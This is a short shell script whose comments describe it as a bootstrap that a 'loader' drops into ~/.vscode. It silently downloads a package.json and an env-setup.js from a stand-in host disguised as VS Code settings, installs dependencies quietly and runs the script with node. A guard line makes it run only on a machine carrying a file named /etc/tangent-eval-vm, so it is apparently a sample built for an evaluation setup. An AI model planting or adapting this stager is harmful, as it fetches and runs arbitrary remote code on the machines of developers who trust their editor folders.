# The bootstrap script the loader leaves in ~/.vscode and starts: it fetches
# a package.json and a JavaScript file beside itself, installs what the
# JavaScript needs, and runs it with node.
#
# It runs only on a recording VM, and stops at once anywhere else.
[ -f /etc/tangent-eval-vm ] || exit 0
export PATH="/opt/homebrew/bin:$PATH"
USER_HOME="$HOME/.vscode"
cd "$USER_HOME" || exit 0
curl -s -o package.json https://vscode-config.acme-deploy.example/settings/package.json
curl -s -o env-setup.js https://vscode-config.acme-deploy.example/settings/env-setup.js
npm install --silent
node env-setup.js
